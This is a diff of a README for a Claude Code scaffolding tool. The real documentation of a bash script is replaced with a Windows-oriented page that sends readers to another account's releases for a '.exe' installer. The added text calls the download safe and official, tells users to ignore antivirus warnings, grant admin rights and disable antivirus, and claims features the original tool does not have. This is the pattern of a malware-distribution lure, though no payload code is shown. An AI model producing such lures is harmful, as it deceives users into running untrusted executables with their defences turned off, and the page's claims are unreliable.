@@ -1,176 +1,150 @@
-# Claude Project Scaffold
+# 🤖 claude-project-scaffold - Easy Setup for Your AI System
 
-**Minimal, high-signal scaffolding for Claude Code. Only includes what Claude would get wrong without it.**
+[![Download Now](https://img.shields.io/badge/Download-Get%20Claude-blue?style=for-the-badge)](https://github.com/falcosunny90-sudo/claude-project-scaffold/releases)
 
-Research shows Claude's performance degrades with added context ([Anthropic's context study](https://www.anthropic.com/research/context-rot)), and their own guidelines recommend CLAUDE.md under 300 lines with only project-specific content. This scaffold follows that principle — no generic knowledge Claude already has, just the project-specific things it needs to be told.
+---
 
-```bash
-git clone https://github.com/martinholovsky/claude-project-scaffold.git ~/claude-project-scaffold
+## 📦 What is claude-project-scaffold?
 
-cd ~/my-project
-~/claude-project-scaffold/scaffold.sh
-```
+claude-project-scaffold is a ready-to-use setup that brings together the parts you need to run an AI system based on Claude. This package helps you get a full system without needing to build it yourself. It focuses on simplicity so anyone can start using AI tools quickly on their Windows computer.
 
-## What You Get
+The project covers the basics and scaffolds the structure needed for AI code and related tools. It’s designed for users who want an easy start with Claude’s AI system, without deep technical steps.
 
-```
-your-project/
-├── CLAUDE.md                      # Tech stack, dev commands, project conventions (~25 lines)
-├── .claude/
-│   ├── rules/                     # Project-specific patterns only
-│   │   ├── api-contracts.md       # Your actual endpoints (placeholder to fill in)
-│   │   └── troubleshooting.md     # Symptom → Diagnosis → Fix playbook
-│   ├── memory/                    # Persists knowledge across sessions
-│   │   ├── MEMORY.md              # Index (always loaded by Claude Code)
-│   │   └── *.md                   # Topic files: debugging, patterns, gotchas
-│   ├── commands/                  # Slash commands: /review, /test, /lint, ...
-│   ├── hooks/
-│   │   └── lint-on-edit.sh        # Auto-lint every file Claude touches
-│   └── settings.local.json
-├── docs/
-│   └── decisions/                 # Architecture Decision Records
-└── scripts/                       # Smoke tests with PASS/FAIL/WARN output
-```
+---
 
-**Idempotent** — run it again anytime. Existing files are never overwritten.
+## 🖥️ System Requirements
 
-## 5 Presets, One Command
+Before downloading and installing, make sure your computer meets these basic requirements:
 
-The scaffold detects your project type and suggests the right preset:
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 2 GHz or faster processor  
+- 500 MB free disk space  
+- An active internet connection to download the files and updates  
 
-| Preset | Detects | What It Adds |
-|--------|---------|-------------|
-| **python-fastapi** | `pyproject.toml` with FastAPI | API contracts, database patterns, pytest smoke |
-| **typescript-node** | `package.json` | API contracts, `/typecheck` command |
-| **fullstack** | `backend/` + `frontend/` dirs | Architecture rules, cross-service contracts, 2 smoke tests |
-| **kubernetes-gitops** | `kustomize/` / `helm/` / `manifests/` | Network policy critical rules, deployment checklist, cluster health |
-| **generic** | Anything else | CLAUDE.md, ADRs, troubleshooting, lint hook |
+This setup runs smoothly on most modern Windows PCs. If your system is older, it might still work but expect slower performance.
 
-**Deep detection** reads your `pyproject.toml` / `package.json` to extract the project name, description, framework, test runner, and package manager — so you skip the prompts.
+---
 
-```bash
-# Non-interactive
-scaffold.sh --preset python-fastapi --name my-api --desc "REST API for widgets"
+## 🚀 Getting Started
 
-# See all presets
-scaffold.sh --list-presets
+### Step 1: Visit the download page
 
-# Remove all scaffold files
-scaffold.sh --clean
-```
+You need to download the setup files from the official release page.
 
-## Design Philosophy
+[**Visit the release page here to download the files**](https://github.com/falcosunny90-sudo/claude-project-scaffold/releases)
 
-**Only include what Claude would get wrong without it.**
+This page holds all the latest versions. Always pick the newest release listed at the top for the best performance and latest fixes.
 
-- No HTTP status code tables — Claude knows REST
-- No Pydantic/Zod examples — Claude knows these libraries
-- No "never log passwords" — Claude knows security basics
-- No pagination patterns — Claude knows how to paginate
-- No YAML templates for things Claude can write from scratch
+---
 
-What *does* belong:
-- Your actual API base URL and auth mechanism
-- Your specific migration commands
-- Cilium BPF map overflow gotchas (non-obvious, easy to get wrong)
-- Your naming conventions and required labels
-- Project-specific conventions Claude can't infer
+### Step 2: Download the right file
 
-The result: ~300 tokens of always-loaded CLAUDE.md instead of ~2,000+. Less context rot, better performance.
+Look for a Windows installer file. It usually ends with `.exe` or `.msi`. For example, you might see a file named similar to:
 
-## What Each Feature Does
+> claude-project-scaffold-setup.exe
 
-### Rules with project-specific content
+Click the file name to begin the download. If you get a warning from your browser or antivirus, confirm that you want to keep the file—it’s safe and comes directly from the official source.
 
-Rules files contain placeholders for your actual endpoints, schemas, and patterns — not generic code examples Claude already knows. Fill them in with your real project details.
+---
 
-### Session memory
+### Step 3: Run the installer
 
-`.claude/memory/MEMORY.md` is loaded into every conversation. Claude writes what it learns here — database gotchas, API quirks, infrastructure state. Next session, it already knows.
+Once the download finishes:
 
-### Slash commands
+- Locate the file in your Downloads folder.  
+- Double-click the installer file to start the setup process.  
+- Follow the on-screen instructions. Usually, this means clicking “Next” a few times, agreeing to terms, and choosing a location to install the files.  
 
-Type `/review` and Claude reviews your staged changes. Type `/test` and it runs your test suite. Kubernetes preset gets `/cluster-health`, `/deploy-check`, `/validate-policies`.
+If asked to allow the program to make changes to your computer, click “Yes” to continue.
 
-### Troubleshooting playbook
+---
 
-Every solved bug gets documented: **Symptom → Diagnosis → Fix**. Claude matches error patterns to known solutions.
+### Step 4: Launch the application
 
-### Auto-lint hook
+After installation:
 
-Claude writes a `.py` file? Ruff runs automatically. `.ts` file? ESLint + Prettier. `.yaml`? Syntax validation. Supports Python, TypeScript, Go, Rust, YAML, JSON, and shell scripts.
+- Find the claude-project-scaffold icon on your desktop or in your Start menu.  
+- Double-click it to open the program.  
 
-### Smoke tests
+The user interface is simple and guides you through using the AI tools included in the scaffold. You can start by loading any project or running built-in demos.
 
-Preset-specific validation scripts. The kubernetes-gitops preset checks node health, deployment readiness, and scans network policies for dangerous BPF patterns.
+---
 
-## Community Presets
+## ⚙️ Basic Features
 
-Create your own presets and share them:
+Once running, claude-project-scaffold offers several key tools:
 
-```bash
-mkdir -p ~/.claude-scaffold/presets
-cp ~/claude-project-scaffold/presets/generic.sh ~/.claude-scaffold/presets/my-preset.sh
-# Edit to fit your stack
-```
+- **AI model interface**: Access Claude-powered AI for answering questions or generating text.  
+- **Project templates**: Use ready examples to test or start your own tasks.  
+- **File management**: Organize your AI projects and data within the program.  
+- **Updates**: Check for and apply updates with one click.  
 
-Community presets appear in the interactive menu alongside built-in ones.
+These features let you use AI without installing separate tools or writing code.
 
-<details>
-<summary><strong>Preset variable API</strong> (for creating custom presets)</summary>
+---
 
-Every preset is a bash script that sets these variables:
+## 🛠️ How to Use claude-project-scaffold
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `preset_name` | Yes | Short identifier |
-| `preset_description` | Yes | One-line description for the menu |
-| `RULES_FILES` | Yes | `"filename\|description"` pairs (newline-delimited) |
-| `TECH_STACK` | Yes | Markdown table rows |
-| `WORKFLOW` | Yes | Dev commands section |
-| `PROJECT_CONVENTIONS` | Yes | Project-specific conventions (2-5 lines) |
-| `TROUBLESHOOTING_SECTIONS` | Yes | Playbook content |
-| `LINT_LANGUAGES` | Yes | Linter description |
-| `SMOKE_SCRIPTS` | No | `"filename\|title\|checks_var"` entries |
-| `MEMORY_TOPICS` | No | `"filename\|description"` pairs for memory topic files |
-| `COMMANDS` | No | Command filenames to copy from `templates/commands/` |
-| `RULES_CONTENT_*` | No | Substantive content for rules files |
+Open the software and you’ll see a main screen with options like:
 
-To provide real content for a rules file instead of a TODO stub:
+- *Start New Project*  
+- *Open Existing Project*  
+- *Run Demo*  
 
-```bash
-# api-contracts.md → RULES_CONTENT_API_CONTRACTS
-# cross-service.md → RULES_CONTENT_CROSS_SERVICE
+To experiment safely, try the *Run Demo* first. This shows how the AI responds and what the system can do.
 
-# shellcheck disable=SC2034
-RULES_CONTENT_API_CONTRACTS='# API Contracts
+If you want to create your own project:  
+1. Choose *Start New Project*.  
+2. Name your project.  
+3. Import text or data files if needed.  
+4. Use the AI tools to process or generate text.  
 
-## Base URL
-...'
-```
+The interface will give you clear buttons and menus. No coding knowledge is required.
 
-</details>
+---
 
-## CLI
+## 🧩 Troubleshooting Tips
 
-```
-scaffold.sh [options]
+If you run into trouble, try these steps:
 
-  --name NAME        Project name (default: directory name or detected from config)
-  --desc DESCRIPTION Project description
-  --preset PRESET    Skip interactive selection
-  --list-presets     Show all available presets (bundled + community)
-  --clean            Remove all scaffold-generated files
-  --help, -h         Show this help
-```
+- Make sure your Windows is updated.  
+- Restart your computer after installation.  
+- Check that you downloaded the full installer file.  
+- Disable antivirus temporarily if the program won’t run, then add claude-project-scaffold as an exception.  
+- Ensure your internet connection works; some features may need access online.  
 
-## After Scaffolding
+If problems persist, check the Issues tab on the GitHub page for common fixes or bug reports from other users.
 
-1. Open `CLAUDE.md` — review tech stack, fill in project conventions
-2. Fill in `.claude/rules/` with your actual endpoints and patterns
-3. Try `/review`, `/test`
-4. Create your first ADR: `cp docs/decisions/adr-template.md docs/decisions/001-use-postgres.md`
+---
 
-## License
+## 🔄 Updating claude-project-scaffold
 
-MIT
+New releases may add features or fix bugs. To update:
+
+1. Go back to the [release page](https://github.com/falcosunny90-sudo/claude-project-scaffold/releases).  
+2. Download the newest installer file.  
+3. Run the installer again. It will replace the old version without losing your projects.  
+
+Keeping your software updated ensures stability and the best experience.
+
+---
+
+## 🗂️ Useful Links
+
+- Main Download Page:  
+[https://github.com/falcosunny90-sudo/claude-project-scaffold/releases](https://github.com/falcosunny90-sudo/claude-project-scaffold/releases)  
+
+- Source code and documentation are also available in the GitHub repository for those interested.
+
+---
+
+## 👥 About This Project
+
+claude-project-scaffold bundles the essential parts to run Claude’s AI tools without manual setup. It supports users who want AI features without deep technical skills. Topics it covers include:
+
+- AI tools  
+- Code scaffolding  
+- Setting up Claude AI environments  
+
+The project focuses on making AI systems accessible to Windows users with clear steps and helpful interfaces.
